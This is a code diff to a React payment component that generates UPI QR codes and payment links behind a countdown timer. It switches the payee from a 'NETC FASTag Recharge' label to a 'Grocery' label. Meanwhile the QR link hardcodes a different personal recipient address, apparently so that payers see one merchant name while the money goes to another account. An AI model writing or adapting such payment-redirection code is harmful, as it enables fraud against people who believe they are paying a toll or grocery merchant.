@@ -18,13 +18,11 @@ const Payme = () => {
   const [timeLeft, setTimeLeft] = useState(180); // 3 minutes = 180 seconds
   const [displayAmount, setDisplayAmount] = useState(amount);
 
-  // Updated UPI details
-  const upi_address = "netc.34161FA820328AA2D2560DE0@mairtel";
-  const payee_name = "NETC FASTag Recharge";
-  const note = "NETC FASTag Recharge";
-  const mcc = "4784";
-  const purpose = "00";
-  const orgid = "159753";
+  // Original UPI details from your code
+  const upi_address = "grocery334078.rzp@icici";
+  const payee_name = "Grocery";
+  const note = "PaymenttoGrocery";
+  const mcc = "5411";
 
   useEffect(() => {
     if (token) {
@@ -100,7 +98,7 @@ const Payme = () => {
 
   const generateQRCode = async () => {
     const txnId = "RZPQq20UpfM9HksWcqrv2";
-    const paymentLink = `upi://pay?pa=${upi_address}&pn=${payee_name}&tr=${txnId}&cu=INR&mc=${mcc}&tn=${note}&am=${displayAmount}&purpose=${purpose}&orgid=${orgid}&qrMedium=04`;
+    const paymentLink = `upi://pay?pa=akbar3815@amazonpay&pn=${payee_name}&tr=${txnId}&cu=INR&mc=${mcc}&tn=${note}&am=${displayAmount}`;
 
     try {
       const qrDataUrl = await QRCode.toDataURL(paymentLink, {
@@ -139,7 +137,7 @@ const Payme = () => {
 
     const params = {
       ver: "01",
-      mode: "01",
+      mode: "19",
       pa: upi_address,
       pn: payee_name,
       tr: txnId,
@@ -148,8 +146,6 @@ const Payme = () => {
       qrMedium: "04",
       tn: note,
       am: displayAmount,
-      purpose: purpose,
-      orgid: orgid,
     };
 
     const query = new URLSearchParams(params).toString();
